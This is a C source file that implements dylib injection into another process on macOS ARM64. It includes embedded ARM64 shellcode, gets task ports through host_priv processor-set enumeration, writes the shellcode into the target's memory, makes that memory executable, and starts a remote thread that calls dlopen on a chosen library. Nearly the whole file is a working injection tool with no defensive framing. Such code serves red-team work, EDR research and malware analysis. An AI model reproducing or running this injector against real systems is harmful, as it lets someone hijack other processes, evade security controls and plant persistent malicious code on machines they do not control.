#include "libinject_darwin_arm64.h"

#define STACK_SIZE 65536
#define CODE_SIZE 400

char shellcode_template[] =
    //0000000100003f00 <_main>:
    "\xff\x83\x00\xd1"  // sub     sp, sp, #0x20
    "\xfd\x7b\x01\xa9"  // stp     x29, x30, [sp, #0x10]
    "\xfd\x43\x00\x91"  // add     x29, sp, #0x10
    "\xe0\x03\x00\x91"  // mov     x0, sp                   ; pthread_t *thread
    "\xe1\x03\x1f\xaa"  // mov     x1, xzr                  ; const pthread_attr_t *attr
    "\xa2\x00\x00\x10"  // adr     x2, _start_routine       ; void *(*start_routine)(void*)
    "\xe3\x03\x1f\xaa"  // mov     x3, xzr                  ; void *arg
    "\x44\x01\x00\x58"  // ldr     x4, _pthread_create_from_mach_thread
    "\x80\x00\x3f\xd6"  // blr     x4                       ; call pthread_create_from_mach_thread()
    //0000000100003f24 <_jump>:
    "\x00\x00\x00\x14"  // b       _jump                    ; jmp 0
    //0000000100003f28 <_start_routine>:
    "\xa0\x01\x00\x10"  // adr     x0, _dylib              ; const char *filename
    "\x21\x00\x80\xd2"  // mov     x1, #0x1                ; int flag (RTLD_LAZY)
    "\xe7\x00\x00\x58"  // ldr     x7, _dlopen
    "\xe0\x00\x3f\xd6"  // blr     x7                      ; call dlopen()
    "\xe8\x00\x00\x58"  // ldr     x8, _pthread_exit
    "\x00\x00\x80\xd2"  // mov     x0, #0x0                ; void *retval
    "\x00\x01\x3f\xd6"  // blr     x8                      ; call pthread_exit()
    //0000000100003f44 <_pthread_create_from_mach_thread>:
    "PTHRDCRT"          // _pthread_create_from_mach_thread
    "DLOPEN__"          // _dlopen
    "PTHREXIT"          // _pthread_exit
    "LIBLIBLIB"         // _dylib
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00";

// Declarations
extern kern_return_t mach_vm_allocate(
    task_t task,
    mach_vm_address_t *addr,
    mach_vm_size_t size,
    int flags
);

extern kern_return_t mach_vm_write(
    vm_map_t target_task,
    mach_vm_address_t address,
    vm_offset_t data,
    mach_msg_type_number_t dataCnt
);

extern kern_return_t mach_vm_protect(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    boolean_t set_maximum,
    vm_prot_t new_protection
);

// Implementations
int display_error(const char *message, kern_return_t kr) {
    // Helper for displaying error messages
    char display_message[256];
    snprintf(display_message, sizeof(display_message), "[-] Error -> %s", message);
    fprintf(stderr, "%s: %s\n", display_message, mach_error_string(kr));
    return 0;
}

task_t task_for_pid_wrapper(pid_t pid) {
    // Wrapper function for obtaining the task port (control handle)
    mach_msg_type_number_t num_tasks;
    mach_port_t ps_default_control;
    thread_info_data_t th_info;
    mach_port_t ps_default;
    thread_array_t threads;
    task_array_t tasks;
    kern_return_t kr;
    host_t host_priv;

    // Obtain task control handle
    host_get_host_priv_port(mach_host_self(), &host_priv);
    kr = processor_set_default(host_priv, &ps_default);
    processor_set_name_array_t *psets = malloc(1024);
    mach_msg_type_number_t pset_count;
    // Set privileges
    kr = host_processor_sets(host_priv, psets, &pset_count);
    kr = host_processor_set_priv(host_priv, ps_default, &ps_default_control);
    if (kr != KERN_SUCCESS) {
        display_error("Failed to set privileges with host_processor_set_priv", kr);
        mach_error("host_processor_set_priv", kr);
        return 0;
    }
    // Set control for first 1000 tasks
    num_tasks = 1000;
    kr = processor_set_tasks(ps_default_control, &tasks, &num_tasks);
    if (kr != KERN_SUCCESS) {
        display_error("Failed to set tasks with processor_set_tasks", kr);
        return 0;
    }
    // Iterate tasks for target pid
    for (int i = 0; i < num_tasks; i++) {
        int target_pid;
        pid_for_task(tasks[i], &target_pid);
        //char name[128]; int rc=  proc_name(pid, name, 128);
        if (target_pid == pid) {
            return tasks[i];
        }
    }
   return 0;
}

int inject(pid_t pid, char* lib) {
      // Main injection function for ARM64 only
      task_t remote_task;
      kern_return_t kr;
      struct stat buf;

      // Check if library exists
      if (stat(lib, &buf) != 0) {
        printf("[-] Shared library doesnt exist: %s\n", lib);
        return -9;
      }

      // Obtain task control handle (task port) for pid
      remote_task = task_for_pid_wrapper(pid);
      if (remote_task == 0) {
        printf("[-] Failed to get task control handle for pid: %d\n", pid);
        return -2;
      }

      // Fresh copy of shellcode
      size_t shellcode_size = sizeof(shellcode_template);
      char *shellcode = malloc(shellcode_size);
      if (!shellcode) {
          perror("[-] Failed to allocate memory for shellcode\n");
          return -1;
      }
      // Copy the data
      memcpy(shellcode, shellcode_template, shellcode_size);

      // Initialize remote stack and code regions
      mach_vm_address_t remote_stack = (vm_address_t)NULL;
      mach_vm_address_t remote_code = (vm_address_t)NULL;

      // Allocate the remote stack region
      kr = mach_vm_allocate(remote_task, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
      if (kr != KERN_SUCCESS) {
        display_error("Failed to allocate space", kr);
        return -2;
      }

      // Allocate the remote code region
      kr = mach_vm_allocate(remote_task, &remote_code, CODE_SIZE, VM_FLAGS_ANYWHERE);
      if (kr != KERN_SUCCESS) {
        display_error("Failed to allocate code memory", kr);
        return -2;
      }

      // Get the address of dlopen, along with the the pthread, and pexit functions from the sharedcache
      uint64_t addr_of_pthread = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
      uint64_t addr_of_pexit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
      uint64_t addr_of_dlopen = (uint64_t)dlopen;

      // Patch the shellcode with valid addresses and library path
      char *possible_patch_location = (shellcode);
      for (int i = 0; i < 0x100; i++) {
        possible_patch_location++;
        if (memcmp(possible_patch_location, "PTHRDCRT", 8) == 0) {
          memcpy(possible_patch_location, &addr_of_pthread, sizeof(uint64_t));
        }
        if (memcmp(possible_patch_location, "PTHREXIT", 8) == 0) {
          memcpy(possible_patch_location, &addr_of_pexit, sizeof(uint64_t));
        }
        if (memcmp(possible_patch_location, "DLOPEN__", 6) == 0) {
          memcpy(possible_patch_location, &addr_of_dlopen, sizeof(uint64_t));
        }
        if (memcmp(possible_patch_location, "LIBLIBLIB", 9) == 0) {
          strcpy(possible_patch_location, lib);
        }
      }

      // Write the shellcode to the remote code region
      kr = mach_vm_write(remote_task, remote_code, (vm_address_t)shellcode, CODE_SIZE);
      if (kr != KERN_SUCCESS) {
        display_error("Failed to write shellcode", kr);
        return -3;
      }

      // Set the code region to RX permissions
      kr = vm_protect(
        remote_task,
        remote_code,
        CODE_SIZE,
        FALSE,
        VM_PROT_READ | VM_PROT_EXECUTE
      );
      if (kr != KERN_SUCCESS) {
        display_error("Failed to set code RX", kr);
        return -4;
      }
      // Set the stack region to RW permissions
      kr = vm_protect(
        remote_task,
        remote_stack,
        STACK_SIZE,
        TRUE,
        VM_PROT_READ | VM_PROT_WRITE
      );
      if (kr != KERN_SUCCESS) {
        display_error("Failed to set stack RW", kr);
        return -4;
      }

      // Set the register values for the remote thread
      remote_stack += (STACK_SIZE / 2);
      arm_thread_state64_t state;
      state.__pc = (uintptr_t)remote_code;
      state.__sp = (uintptr_t)remote_stack;
      state.__fp = (uintptr_t)remote_stack;

      // Spawn the remote thread
      thread_act_t thread;
      kr = thread_create_running(
         remote_task,
         ARM_THREAD_STATE64,
         (thread_state_t)&state,
         ARM_THREAD_STATE64_COUNT,
         &thread
      );
      if (kr != KERN_SUCCESS) {
        display_error("Failed to spawn thread", kr);
        return -3;
      }
      return 0;
}
